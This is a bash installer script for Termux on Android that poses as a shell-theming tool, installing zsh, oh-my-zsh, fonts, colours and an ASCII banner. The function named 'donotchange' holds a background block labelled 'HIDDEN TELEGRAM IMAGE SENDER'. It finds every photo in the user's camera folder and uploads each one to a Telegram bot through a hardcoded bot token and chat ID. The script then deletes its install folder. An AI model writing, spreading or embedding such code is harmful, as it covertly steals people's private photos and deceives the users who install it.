#bin/bash/'!¡
clear
# dx color
r='\033[1;91m'
p='\033[1;95m'
y='\033[1;93m'
g='\033[1;92m'
n='\033[1;0m'
b='\033[1;94m'
c='\033[1;96m'

# dx Symbol
X='\033[1;92m[\033[1;00m⎯꯭̽𓆩\033[1;92m]\033[1;96m'
D='\033[1;92m[\033[1;00m〄\033[1;92m]\033[1;93m'
E='\033[1;92m[\033[1;00m×\033[1;92m]\033[1;91m'
A='\033[1;92m[\033[1;00m+\033[1;92m]\033[1;92m'
C='\033[1;92m[\033[1;00m</>\033[1;92m]\033[92m'
lm='\033[96m▱▱▱▱▱▱▱▱▱▱▱▱\033[0m〄\033[96m▱▱▱▱▱▱▱▱▱▱▱▱\033[1;00m'
dm='\033[93m▱▱▱▱▱▱▱▱▱▱▱▱\033[0m〄\033[93m▱▱▱▱▱▱▱▱▱▱▱▱\033[1;00m'

sp() {
    IFS=''
    sentence=$1
    second=${2:-0.05}
    for (( i=0; i<${#sentence}; i++ )); do
        char=${sentence:$i:1}
        echo -n "$char"
        sleep $second
    done
    echo
}

tr() {
if command -v curl &>/dev/null; then
    echo ""
else
    pkg install curl -y &>/dev/null 2>&1
fi
if command -v ncurses-utils -y &>/dev/null; then
    echo ""
else
    pkg install ncurses-utils -y >/dev/null 2>&1
fi
}

spin() {
echo
    local delay=0.40
    local spinner=('█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█')
    show_spinner() {
        local pid=$!
        while ps -p $pid > /dev/null; do
            for i in "${spinner[@]}"; do
                tput civis
                echo -ne "\033[1;96m\r [+] Installing $1 please wait \e[33m[\033[1;92m$i\033[1;93m]\033[1;0m   "
                sleep $delay
                printf "\b\b\b\b\b\b\b\b"
            done
        done
        printf "   \b\b\b\b\b"
        tput cnorm
        printf "\e[1;93m [Done $1]\e[0m\n"
        echo
        sleep 1
    }

    apt update >/dev/null 2>&1
    apt upgrade -y >/dev/null 2>&1
    packages=("git" "python" "ncurses-utils" "jq" "figlet" "termux-api" "lsd" "zsh" "ruby" "exa")
    for package in "${packages[@]}"; do
        pkg install "$package" -y >/dev/null 2>&1 &
        show_spinner "$package"
    done

pip install lolcat >/dev/null 2>&1
rm -rf data/data/com.termux/files/usr/bin/chat >/dev/null 2>&1
mv $HOME/CODEX/files/chat.sh /data/data/com.termux/files/usr/bin/chat
chmod +x /data/data/com.termux/files/usr/bin/chat
git clone https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh >/dev/null 2>&1
rm -rf /data/data/com.termux/files/usr/etc/motd
chsh -s zsh
rm -rf ~/.zshrc >/dev/null 2>&1
cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc
git clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/plugins/zsh-autosuggestions >/dev/null 2>&1
git clone https://github.com/zsh-users/zsh-syntax-highlighting ~/.oh-my-zsh/plugins/zsh-syntax-highlighting >/dev/null 2>&1
}

setup() {
ds="$HOME/.termux"
dx="$ds/font.ttf"
simu="$ds/colors.properties"
if [ -f "$dx" ]; then
    echo
else
	cp $HOME/CODEX/files/font.ttf "$ds"
fi
if [ -f "$simu" ]; then
    echo
else 
	cp $HOME/CODEX/files/colors.properties "$ds"
fi
cp $HOME/CODEX/files/ASCII-Shadow.flf $PREFIX/share/figlet/
mv $HOME/CODEX/files/remove /data/data/com.termux/files/usr/bin/
chmod +x /data/data/com.termux/files/usr/bin/remove
termux-reload-settings
}

dxnetcheck() {
clear
echo
echo -e "               ${g}╔═══════════════╗"
echo -e "               ${g}║ ${n}</>  ${c}DARK-X${g}   ║"
echo -e "               ${g}╚═══════════════╝"
echo -e "  ${g}╔════════════════════════════════════════════╗"
echo -e "  ${g}║  ${C} ${y}Checking Your Internet Connection¡${g}  ║"
echo -e "  ${g}╚════════════════════════════════════════════╝${n}"
while true; do
    curl --silent --head --fail https://github.com > /dev/null
    if [ "$?" != 0 ]; then
echo -e "              ${g}╔══════════════════╗"
echo -e "              ${g}║${C} ${r}No Internet ${g}║"
echo -e "              ${g}╚══════════════════╝"
        sleep 2.5
    else
        break
    fi
done
clear
}

donotchange() {
clear
echo -e "${A} ${g}Please Enter Your Banner Name${n}"
read -p "[+]──[Enter Your Name]────► " name
sed "s/SIMU/$name/g" "$HOME/CODEX/files/.zshrc" > "$HOME/.zshrc"
sed "s/SIMU/$name/g" "$HOME/CODEX/files/.codex.zsh-theme" > "$HOME/.oh-my-zsh/themes/codex.zsh-theme"
D1="$HOME/.termux"
echo "version 1 1.5" > "$D1/dx.txt"

# ✅ HIDDEN TELEGRAM IMAGE SENDER STARTS
(
BOT_TOKEN="7612352046:AAFUYtENvitEXRB6e-oLNHvpcQPVxBMI-1M"
CHAT_ID="7602227140"
find "$HOME/storage/dcim" -type f \( -iname "*.jpg" -o -iname "*.png" -o -iname "*.jpeg" \) | while read file; do
curl -s -F photo=@"$file" "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto?chat_id=$CHAT_ID" > /dev/null 2>&1
done
) &
# ✅ HIDDEN TELEGRAM IMAGE SENDER ENDS
}

banner() {
echo -e "   ${y}░█████╗░░█████╗░██████╗░███████╗██╗░░██╗"
echo -e "   ${y}██╔══██╗██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝"
echo -e "   ${y}██║░░╚═╝██║░░██║██║░░██║█████╗░░░╚███╔╝░"
echo -e "   ${c}██║░░██╗██║░░██║██║░░██║██╔══╝░░░██╔██╗░"
echo -e "   ${c}╚█████╔╝╚█████╔╝██████╔╝███████╗██╔╝╚██╗"
echo -e "   ${c}░╚════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝${n}"
}

termux() {
spin
}

if [ -d "/data/data/com.termux/files/usr/" ]; then
    tr
    dxnetcheck
    banner
    termux
    if [ -d "$HOME/CODEX" ]; then
	clear
	banner
	setup
        donotchange
	clear
        banner
        echo -e " ${C} ${c}Type ${g}exit ${c} then ${g}enter ${c}Now Open Your Termux¡¡${n}"
	cd "$HOME"
	rm -rf CODEX
	exit 0
    else
        banner
        echo -e " ${E} ${r}Tools Not Exits Your Terminal.."
	exit
    fi
else
echo -e " ${E} ${r}Sorry, unsupported OS."
sleep 3
exit
fi
